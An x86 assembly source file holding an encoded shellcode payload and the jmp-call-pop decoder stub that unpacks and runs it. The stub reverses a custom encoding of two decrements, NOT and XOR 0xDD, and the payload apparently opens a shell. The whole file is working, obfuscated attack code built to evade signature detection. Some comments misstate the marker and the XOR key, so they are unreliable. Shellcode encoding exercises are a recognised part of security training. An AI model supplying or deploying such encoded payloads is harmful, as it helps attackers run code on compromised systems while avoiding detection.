global _start			

section .text
_start:

	jmp short shellcode

decoder:

	pop esi			; pop shellcode into esi

decode:

	cmp byte [esi], 0xbb	; compare current esi byte with our 0xaa marker
	jz code			; if compare succeeds, jump to shellcode
	dec byte [esi]
	dec byte [esi]
	not byte [esi]		; NOT operation of current byte in esi
	xor byte [esi], 0xDD	; XOR with 0xaa

	inc esi			; move to next byte in esi
	jmp short decode	; jump back to start of decode

shellcode:

	call decoder		; pushes shellcode to stack and jumps to decoder_setup

	code: db 0x15,0xe4,0x74,0x4c,0x0f,0x0f,0x53,0x4c,0x4c,0x0f,0x42,0x4d,0x4e,0xad,0xc3,0x74,0xad,0xc2,0x73,0xad,0xc5,0x94,0x2b,0xf1,0xa4,0xbb
